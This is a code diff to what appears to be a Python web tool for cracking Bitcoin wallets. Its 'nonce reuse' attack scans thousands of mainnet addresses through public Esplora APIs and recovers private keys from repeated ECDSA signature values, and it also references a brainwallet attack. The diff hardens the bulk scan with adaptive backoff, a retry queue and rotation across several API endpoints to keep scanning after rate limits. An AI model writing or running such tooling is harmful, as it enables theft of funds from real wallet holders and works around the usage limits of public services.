@@ -108,14 +108,24 @@ DATASET_PREFER_BALANCE_TSV = os.environ.get(
     "DATASET_PREFER_BALANCE_TSV", "1").strip().lower() not in (
         "0", "false", "no", "off")
 ESPLORA    = os.environ.get("ESPLORA_URL", "https://blockstream.info/api")
-# Politeness limits for bulk nonce scans against public Esplora instances:
-# one request per ESPLORA_MIN_INTERVAL seconds, a bounded response cache and a
-# short retry/backoff on 429/5xx. Set the interval to 0 to disable pacing.
-ESPLORA_MIN_INTERVAL   = max(0.0, _env_float("ESPLORA_MIN_INTERVAL", 0.15))
-ESPLORA_MAX_RETRIES    = _env_int("ESPLORA_MAX_RETRIES", 2, 0)
-ESPLORA_CACHE_SIZE     = _env_int("ESPLORA_CACHE_SIZE", 4096, 0)
-NONCE_MAX_ADDRESSES    = _env_int("NONCE_MAX_ADDRESSES", 5000, 1)
-NONCE_MAX_UPLOAD_BYTES = _env_int("NONCE_MAX_UPLOAD_BYTES", 2_000_000, 1024)
+# Optional comma-separated list of MAINNET Esplora base URLs. On a 429 the
+# next attempt rotates to the following endpoint after the global cooldown.
+# Never put testnet endpoints here — the address list is mainnet.
+_ESPLORA_BASES = [u.strip().rstrip("/") for u in
+                  os.environ.get("ESPLORA_URLS", ESPLORA).split(",") if u.strip()]
+if not _ESPLORA_BASES:
+    _ESPLORA_BASES = [ESPLORA]
+# Politeness limits for bulk nonce scans against public Esplora instances.
+# 0.15 s was too fast: ~750 requests (29 addresses x ~26 calls) triggered a
+# 429 that then persisted for the rest of a 3,000-address run.
+ESPLORA_MIN_INTERVAL     = max(0.0, _env_float("ESPLORA_MIN_INTERVAL", 0.3))
+ESPLORA_MAX_RETRIES      = _env_int("ESPLORA_MAX_RETRIES", 2, 0)
+ESPLORA_CACHE_SIZE       = _env_int("ESPLORA_CACHE_SIZE", 4096, 0)
+ESPLORA_MAX_BACKOFF_SECS = max(1.0, _env_float("ESPLORA_MAX_BACKOFF_SECS", 60))
+ESPLORA_PACE_MAX_SECS    = max(0.0, _env_float("ESPLORA_PACE_MAX_SECS", 2))
+NONCE_MAX_ADDRESSES      = _env_int("NONCE_MAX_ADDRESSES", 5000, 1)
+NONCE_MAX_UPLOAD_BYTES   = _env_int("NONCE_MAX_UPLOAD_BYTES", 2_000_000, 1024)
+NONCE_RETRY_FILE         = "nonce_retry.txt"
 # Bloom false-positive rate. 0.001 gave ~12,000 spurious ★★★ HITs per 4M
 # timestamps x 3 derived addresses; 1e-6 cuts that to ~12. A smaller rate
 # needs a bigger bitset (~90 MB -> ~183 MB for 51M rows) and more hash rounds.
@@ -915,11 +925,19 @@ def attack_brainwallet(passphrases, bf, log, job):
 # ════════════════════════════════════════════════════════════════════
 # ATTACK 3 — NONCE REUSE
 # ════════════════════════════════════════════════════════════════════
-# ── Esplora access: pacing, bounded cache, bounded retries ──────────────
-_ESPLORA_LOCK = threading.Lock()
-_ESPLORA_LAST = [0.0]
+# ── Esplora access: pacing, bounded cache, adaptive 429 cooldown ────────
+class _EsploraRateLimited(RuntimeError):
+    """A 429/5xx that must reach the bulk runner as 'unchecked', not 0 hits."""
+
 _ESPLORA_CACHE = OrderedDict()
 _ESPLORA_CACHE_LOCK = threading.Lock()
+# Shared by every request in the process. A 429 sets a deadline that ALL
+# later requests wait for, so one rate limit cannot cascade into 3,000
+# instant failures. Stop remains responsive during those waits.
+_RATE_LOCK = threading.Lock()
+_RATE_NEXT = [0.0]
+_RATE_INTERVAL = [ESPLORA_MIN_INTERVAL]
+_RATE_FAILURES = [0]
 
 def _esplora_cache_get(path):
     if ESPLORA_CACHE_SIZE <= 0:
@@ -943,17 +961,64 @@ def _esplora_cache_put(path, text):
         while len(_ESPLORA_CACHE) > ESPLORA_CACHE_SIZE:
             _ESPLORA_CACHE.popitem(last=False)
 
-def _esplora_pace():
-    if ESPLORA_MIN_INTERVAL <= 0:
-        return
-    with _ESPLORA_LOCK:
-        wait = _ESPLORA_LAST[0] + ESPLORA_MIN_INTERVAL - time.monotonic()
-        if wait > 0:
-            time.sleep(wait)
-        _ESPLORA_LAST[0] = time.monotonic()
+def _esplora_sleep(seconds, should_stop=None):
+    """Interruptible sleep so Stop still works during a long 429 cooldown."""
+    end = time.monotonic() + max(0.0, seconds)
+    while True:
+        if should_stop and should_stop():
+            raise RuntimeError("stopped by user")
+        left = end - time.monotonic()
+        if left <= 0:
+            return
+        time.sleep(min(0.25, left))
+
+def _esplora_pace(should_stop=None):
+    with _RATE_LOCK:
+        wait = _RATE_NEXT[0] - time.monotonic()
+        interval = _RATE_INTERVAL[0]
+    _esplora_sleep(wait, should_stop)
+    with _RATE_LOCK:
+        _RATE_NEXT[0] = max(_RATE_NEXT[0], time.monotonic()) + interval
+
+def _retry_after_seconds(response):
+    v = response.headers.get("Retry-After") if response is not None else None
+    if not v:
+        return 0.0
+    try:
+        return max(0.0, float(v.strip()))
+    except (TypeError, ValueError):
+        pass
+    try:
+        from email.utils import parsedate_to_datetime
+        dt = parsedate_to_datetime(v)
+        if dt is not None:
+            return max(0.0, dt.timestamp() - time.time())
+    except Exception:
+        pass
+    return 0.0
+
+def _esplora_rate_limited(response):
+    """One 429 pauses the whole scan; spacing doubles until requests succeed."""
+    hint = _retry_after_seconds(response)
+    with _RATE_LOCK:
+        _RATE_FAILURES[0] += 1
+        f = _RATE_FAILURES[0]
+        backoff = min(ESPLORA_MAX_BACKOFF_SECS,
+                      max(hint, 2.0 * (2 ** min(f - 1, 5))))
+        _RATE_NEXT[0] = max(_RATE_NEXT[0], time.monotonic() + backoff)
+        base = max(ESPLORA_MIN_INTERVAL, 0.25)
+        _RATE_INTERVAL[0] = min(ESPLORA_PACE_MAX_SECS,
+                                max(_RATE_INTERVAL[0], base) * 2)
+
+def _esplora_rate_ok():
+    with _RATE_LOCK:
+        _RATE_FAILURES[0] = 0
+        if _RATE_INTERVAL[0] > ESPLORA_MIN_INTERVAL:
+            _RATE_INTERVAL[0] = max(ESPLORA_MIN_INTERVAL,
+                                    _RATE_INTERVAL[0] * 0.8)
 
 def _esplora_get(path, should_stop=None):
-    """GET one Esplora path, with caching, pacing, retries and stop checks."""
+    """GET one Esplora path: cache, pacing, 429 cooldown, endpoint rotation."""
     hit = _esplora_cache_get(path)
     if hit is not None:
         return hit
@@ -961,20 +1026,30 @@ def _esplora_get(path, should_stop=None):
     for attempt in range(ESPLORA_MAX_RETRIES + 1):
         if should_stop and should_stop():
             raise RuntimeError("stopped by user")
-        if attempt:
-            time.sleep(min(2 ** (attempt - 1), 4))
-        _esplora_pace()
+        base = _ESPLORA_BASES[attempt % len(_ESPLORA_BASES)]
+        _esplora_pace(should_stop)
         try:
-            r = requests.get(f"{ESPLORA}{path}", timeout=25)
+            r = requests.get(f"{base}{path}", timeout=25)
             if r.status_code == 429 or r.status_code >= 500:
-                raise RuntimeError(f"HTTP {r.status_code}")
+                _esplora_rate_limited(r)
+                last_err = _EsploraRateLimited(
+                    f"HTTP {r.status_code} from {base} — cooling down")
+                continue
             r.raise_for_status()
             text = r.text
+        except RuntimeError as e:
+            if "stopped by user" in str(e):
+                raise
+            last_err = e
+            continue
         except Exception as e:
             last_err = e
             continue
+        _esplora_rate_ok()
         _esplora_cache_put(path, text)
         return text
+    if isinstance(last_err, _EsploraRateLimited):
+        raise last_err
     raise RuntimeError(
         f"Esplora request failed after {ESPLORA_MAX_RETRIES + 1} attempt(s): {last_err}")
 
@@ -1094,6 +1169,11 @@ def _fetch_sigs_for_address(addr, log, should_stop=None):
     try:
         txt = _esplora_get(f"/address/{addr}/txs", should_stop)
         txs = json.loads(txt)
+    except (_EsploraRateLimited, RuntimeError) as e:
+        if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
+            raise                    # do NOT report this as "0 signatures"
+        log(f"[nonce] address fetch failed: {e}")
+        return sigs
     except Exception as e:
         log(f"[nonce] address fetch failed: {e}")
         return sigs
@@ -1103,12 +1183,22 @@ def _fetch_sigs_for_address(addr, log, should_stop=None):
             log("[nonce] stopped")
             break
         txid = tx.get('txid')
+        if not txid:
+            continue
+        # A tx with no legacy scriptSig (native segwit / taproot) cannot yield
+        # a legacy DER signature, so don't spend a /tx/{txid}/hex call on it.
+        # The address/txs response already contains vin[].scriptsig.
+        vin = tx.get('vin', [])
+        if not any(inp.get('scriptsig') for inp in vin):
+            continue
         try:
             raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex", should_stop))
+        except (_EsploraRateLimited, RuntimeError) as e:
+            if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
+                raise
+            continue
         except Exception:
             continue
-        # try legacy first
-        vin = tx.get('vin', [])
         for idx, inp in enumerate(vin):
             if should_stop and should_stop():
                 break
@@ -1182,14 +1272,21 @@ def attack_nonce_reuse(address, log, job, should_stop=None, prefix=""):
 
 
 def attack_nonce_reuse_bulk(addresses, log, job):
-    """Scan a list of addresses for ECDSA nonce reuse, with progress + Stop."""
+    """Scan a list of addresses for ECDSA nonce reuse, with progress + Stop.
+
+    A rate-limited address is NOT counted as scanned. It is queued for one
+    retry pass after the cooldown and, if still blocked, written to
+    nonce_retry.txt on the data disk so it can be re-uploaded — instead of a
+    misleading "100% done, 0 hits" after the first 429.
+    """
     total = len(addresses)
     log(f"[nonce] bulk scan: {total:,} address(es)")
     if not total:
         job["detail"] = "no addresses"
         return []
     t0 = time.time()
-    all_hits = []
+    all_hits, failed = [], []
+    checked = 0
     for i, addr in enumerate(addresses):
         if job["stop"]:
             log("[nonce] stopped by user")
@@ -1198,24 +1295,65 @@ def attack_nonce_reuse_bulk(addresses, log, job):
         try:
             all_hits.extend(attack_nonce_reuse(
                 addr, log, job, should_stop=lambda: job["stop"], prefix=prefix))
+            checked += 1
+        except _EsploraRateLimited as e:
+            failed.append(addr)
+            log(f"{prefix}[!] rate limited — queued for retry ({e})")
         except RuntimeError as e:
             if "stopped by user" in str(e):
                 log("[nonce] stopped by user")
                 break
             log(f"{prefix}[!] {e}")
+            checked += 1
         except Exception as e:
             # One bad address must not abort a multi-thousand-address scan.
             log(f"{prefix}[!] {e}")
-            continue
+            checked += 1
         done = i + 1
         elapsed = max(time.time() - t0, 0.001)
         rate = done / elapsed
         eta = (total - done) / max(rate, 0.001)
         job["progress"] = done / total
         job["detail"] = (f"{done:,}/{total:,} addresses  "
-                         f"hits={len(all_hits):,}  {rate:.2f} addr/s  "
-                         f"eta ~{eta/60:.1f} min")
-    log(f"[nonce] bulk done — {len(all_hits):,} hits over {total:,} addresses")
+                         f"hits={len(all_hits):,}  unchecked={len(failed):,}  "
+                         f"{rate:.2f} addr/s  eta ~{eta/60:.1f} min")
+
+    if failed and not job["stop"]:
+        log(f"[nonce] retrying {len(failed):,} rate-limited address(es) "
+            "after the cooldown")
+        still = []
+        for j, addr in enumerate(failed):
+            if job["stop"]:
+                still.extend(failed[j:])
+                break
+            prefix = f"[retry {j+1:,}/{len(failed):,}] "
+            try:
+                attack_nonce_reuse(addr, log, job,
+                                   should_stop=lambda: job["stop"], prefix=prefix)
+                checked += 1
+            except _EsploraRateLimited:
+                still.append(addr)
+            except Exception as e:
+                log(f"{prefix}[!] {e}")
+                still.append(addr)
+        failed = still
+
+    if failed:
+        retry_path = DATA_DIR / NONCE_RETRY_FILE
+        try:
+            retry_path.write_text("\n".join(failed) + "\n", encoding="utf-8")
+            saved = retry_path.name
+        except OSError:
+            saved = "(could not write retry file)"
+        job["partial"] = True
+        job["progress"] = min(1.0, checked / total)
+        job["detail"] = (f"{checked:,}/{total:,} checked — "
+                         f"{len(failed):,} unchecked, saved to {saved} "
+                         "for re-upload")
+        log(f"[nonce] {len(failed):,} address(es) still unchecked — "
+            f"saved to {saved}")
+    log(f"[nonce] bulk done — {len(all_hits):,} hits over "
+        f"{checked:,}/{total:,} address(es) checked")
     return all_hits
 
 
@@ -1420,7 +1558,8 @@ def _start_job(name, fn, *args):
             if job["error"]:
                 job["detail"] = f"failed: {job['error']}"
             else:
-                job["progress"] = 1.0
+                if not job.get("partial"):
+                    job["progress"] = 1.0
                 job["detail"] = job["detail"] or "done"
             _sync_busy()
 
@@ -1826,11 +1965,14 @@ repeated r values, recovers the private key.</p>
 <p class="muted">Blank lines, # comments, duplicate lines and everything after
 the first column are ignored; invalid lines are counted in the status message.
 Both legacy 1.../3... and bech32 bc1... addresses are accepted. Requests are
-paced (default 0.15 s each) and cached, so a few thousand addresses against
-the public API takes minutes, not seconds. Only legacy P2PKH spends are parsed
-— segwit witness signatures are not supported yet. A recovered key that does
-not reproduce the target address is logged but not saved. Hits appear on
-/results.</p>
+paced (default 0.3 s each) and cached; on HTTP 429 the whole scan cools down
+(honouring Retry-After) instead of silently skipping addresses. A few thousand
+addresses against the public API takes hours, not minutes. Any address still
+unchecked is saved to nonce_retry.txt on the data disk for re-upload. Only
+legacy P2PKH spends are parsed — segwit witness and taproot signatures are not
+supported yet, and Esplora returns just the most recent 25 txs per address.
+A recovered key that does not reproduce the target address is logged but not
+saved. Hits appear on /results.</p>
 </div>
 <div class="card"><h2>Progress</h2>
 <div class="bar"><div id="bar" style="width:0%"></div></div>
@@ -2040,7 +2182,8 @@ def api_job_status(name):
             payload = {"exists": True, "alive": job["alive"],
                        "progress": job["progress"], "detail": job["detail"],
                        "error": job["error"], "log": new, "log_len": total,
-                       "started": job["started"]}
+                       "started": job["started"],
+                       "partial": bool(job.get("partial", False))}
     return Response(json.dumps(payload), mimetype="application/json",
                     headers={"Cache-Control": "no-store, max-age=0"})
 
